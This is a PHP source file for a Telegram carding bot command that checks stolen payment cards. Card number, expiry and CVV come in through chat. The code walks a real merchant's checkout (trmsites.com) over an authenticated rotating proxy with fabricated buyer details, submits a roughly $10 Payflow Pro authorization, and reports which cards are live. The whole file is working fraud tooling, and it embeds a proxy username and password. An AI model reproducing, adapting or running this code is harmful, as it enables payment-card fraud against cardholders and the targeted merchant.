<?php
if(strpos($message, '!iz') === 0 or strpos($message, '/iz') === 0 or strpos($message, '.iz') === 0){
    sendaction($chatId, typing);
$NameGater ='Isola';
$gateway = '/iz :'.$NameGater;
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}


if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Payflow 10$</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!iz card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow 10$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #


$retry = 0;

start:
    
if($retry > 7)
{
    bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Error Proxy</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
return;
}

$socks5 = "brd.superproxy.io:22225";
$rotate = "brd-customer-hl_6d8d7b70-zone-datacenter_proxy1:8j35c9su82d3";


$client = new \GuzzleHttp\Client();
$jar = new \GuzzleHttp\Cookie\CookieJar();

$proxy = [
    'https' => 'http://' . $rotate . '@' . $socks5, // Proxy HTTPS con autenticación
];

$headers = [
    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Cache-Control' => 'no-cache',
    'Connection' => 'keep-alive',
    'Content-Type' => 'application/x-www-form-urlencoded',
    'Host' => 'www.trmsites.com',
    'Origin' => 'https://www.trmsites.com',
    'Pragma' => 'no-cache',
    'Referer' => 'https://www.trmsites.com/landstar/proddetail.asp?siteid=90017&prod=LSC%2D132',
    'Upgrade-Insecure-Requests' => '1',
    'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
];

$url = 'https://www.trmsites.com/landstar/cart.asp?siteid=90017&sid=';
$postdata = 'optnSizeColor=&optnCustEmb=&optnUplExt=&quant=1&id=LSC-566&mode=add&x=53&y=12&pCpnItem=0';
$response = $client->post($url, [
    'body' => $postdata,
    'headers' => $headers, 
    'cookies' => $jar, 
    'proxy' => $proxy, 
]);
$redig = trim(strip_tags(GetStr($response->getBody(),'<td width="100%"><form method="POST" action="','"')));
$sessionid = trim(strip_tags(GetStr($response->getBody(),'<input type="hidden" name="sessionid" value="','"')));


$headers = [
    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language' => 'es-ES,es;q=0.9',
    'Cache-Control' => 'no-cache',
    'Connection' => 'keep-alive',
    'Content-Type' => 'application/x-www-form-urlencoded',
    'Host' => 'www.trmsites.com',
    'Origin' => 'https://www.trmsites.com',
    'Pragma' => 'no-cache',
    'Referer' => 'https://www.trmsites.com/landstar/cart.asp?siteid=90017&sid=',
    'Sec-Fetch-Dest' => 'document',
    'Sec-Fetch-Mode' => 'navigate',
    'Sec-Fetch-Site' => 'same-origin',
    'Sec-Fetch-User' => '?1',
    'Upgrade-Insecure-Requests' => '1',
    'User-Agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
];

$postdata = 'mode=logon&sessionid='.$sessionid.'&chkouttype=&agree1=1';
$response = $client->post($redig, [
    'body' => $postdata,
    'headers' => $headers, 
    'cookies' => $jar, 
    'proxy' => $proxy, 
]);

$headers = [
    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language' => 'es-ES,es;q=0.9',
    'Cache-Control' => 'no-cache',
    'Connection' => 'keep-alive',
    'Content-Type' => 'application/x-www-form-urlencoded',
    'Host' => 'www.trmsites.com',
    'Origin' => 'https://www.trmsites.com',
    'Pragma' => 'no-cache',
    'Referer' => 'https://www.trmsites.com/landstar/cart.asp?siteid=90017&sid=',
    'Sec-Fetch-Dest' => 'document',
    'Sec-Fetch-Mode' => 'navigate',
    'Sec-Fetch-Site' => 'same-origin',
    'Sec-Fetch-User' => '?1',
    'Upgrade-Insecure-Requests' => '1',
    'User-Agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
];

$url = 'https://www.trmsites.com/landstar/cart.asp?id=90017&sid=';
$postdata = 'mode=precheckout&sessionid='.$sessionid.'&cusExtNum=&spclshipchgs=&email=abiye_fulle%40gmail.com&company=Cme&phone=%28408%29+264-5651&name=Abagail&name2=Fadel&address=203+West+Washington+Street&address2=&city=Oswego&state=Illinois&state2=Illinois&country=United+States+of+America&zip=60543&sResidence=OFF&sCompany=Cme&sPhone=4082645651&sname=Abagail&sname2=Fadel&saddress=203+West+Washington+Street&saddress2=&scity=Oswego&sstate=Illinois&sstate2=Illinois&scountry=United+States+of+America&szip=60543&ordAddInfo=&optout=0&remember=1&x=64&y=16';
$response = $client->post($url, [
    'body' => $postdata,
    'headers' => $headers, 
    'cookies' => $jar, 
    'proxy' => $proxy, 
]);

$headers = [
    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language' => 'es-ES,es;q=0.9',
    'Cache-Control' => 'no-cache',
    'Connection' => 'keep-alive',
    'Content-Type' => 'application/x-www-form-urlencoded',
    'Host' => 'www.trmsites.com',
    'Origin' => 'https://www.trmsites.com',
    'Pragma' => 'no-cache',
    'Referer' => 'https://www.trmsites.com/landstar/cart.asp?siteid=90017&sid=',
    'Sec-Fetch-Dest' => 'document',
    'Sec-Fetch-Mode' => 'navigate',
    'Sec-Fetch-Site' => 'same-origin',
    'Sec-Fetch-User' => '?1',
    'Upgrade-Insecure-Requests' => '1',
    'User-Agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
];


$url = 'https://www.trmsites.com/landstar/cart.asp?siteid=90017&sid=';
$postdata = 'mode=go&address2=&city=Oswego&spclshipchgs=&sCompany=Cme&shipcountry=United+States+of+America&name2=Fadel&shipstate=Illinois&scity=Oswego&destzip=60543&phone=%28408%29+264-5651&sPhone=4082645651&optout=0&cusExtNum=&company=Cme&address=203+West+Washington+Street&sstate=Illinois&email=abiyoe_fulle%40gmail.com&name=Abagail&sname2=Fadel&scountry=United+States+of+America&state=Illinois&sResidence=OFF&szip=60543&ordAddInfo=&state2=Illinois&country=United+States+of+America&zip=60543&sname=Abagail&saddress=203+West+Washington+Street&saddress2=&sstate2=Illinois&chkouttype=2&sessionid='.$sessionid.'&payprovider=7&x=83&y=14';
$response = $client->post($url, [
    'body' => $postdata,
    'headers' => $headers, 
    'cookies' => $jar, 
    'proxy' => $proxy, 
]);

$url = 'https://www.trmsites.com/landstar/cart.asp?siteid=90017&sid=';
$postdata = 'toPayMode=1&mode=go&address2=&city=Oswego&spclshipchgs=&sCompany=Cme&sessionid='.$sessionid.'&shipcountry=United+States+of+America&name2=Fadel&shipstate=Illinois&scity=Oswego&destzip=60543&phone=%28408%29+264-5651&sPhone=4082645651&optout=0&cusExtNum=&company=Cme&address=203+West+Washington+Street&sstate=Illinois&email=abiyoe_fulle%40gmail.com&name=Abagail&sname2=Fadel&scountry=United+States+of+America&state=Illinois&sResidence=OFF&szip=60543&ordAddInfo=&state2=Illinois&payprovider=7&x=83&country=United+States+of+America&zip=60543&sname=Abagail&saddress=203+West+Washington+Street&saddress2=&sstate2=Illinois&chkouttype=2&y=14&shipping=7.8%7C0%7CFEGD1&x=82&y=15';
$response = $client->post($url, [
    'body' => $postdata,
    'headers' => $headers, 
    'cookies' => $jar, 
    'proxy' => $proxy, 
    'allow_redirects' => false,
]);
$ordernumber = trim(strip_tags(GetStr($response->getBody(),'<INPUT TYPE="hidden" NAME="ordernumber" VALUE="','"')));

$url = 'https://www.trmsites.com/landstar/cart.asp?siteid=90017&sid=';
$postdata = 'mode=authorize&method=payflowpro&ordernumber='.$ordernumber.'&xxpreauth='.$ordernumber.'&ordbuyer=Agent&ACCT='.$cc.'&EXMON='.$mes.'&EXYEAR='.$ano.'&CVV2='.$cvv.'&cardZip=60543&x=50&y=21';
$result2 = $client->post($url, [
    'body' => $postdata,
    'headers' => $headers, 
    'cookies' => $jar, 
    'proxy' => $proxy, 
    'allow_redirects' => false,
])->getBody();
$message = trim(strip_tags(GetStr($result2,'<b>Transaction Result:</b></td><td bgcolor="#FFFFFF" width="50%"><b><SPAN STYLE="COLOR:#FF0000;">','</SPAN>')));
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow 10$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if ((strpos($result2, "CVV2 Mismatch")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
$status = "Approved! 🟩";
$response = "CVV2 Mismatch🟩";
}elseif ((strpos($result2, "Order Confirmation")) || (strpos($result2, "Approved")) || (strpos($result2, "Order Number"))){
$status = "Approved!🟩";
$response = "Charge 10$🟩";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "$message";
   }

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow 10$
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
}
?>

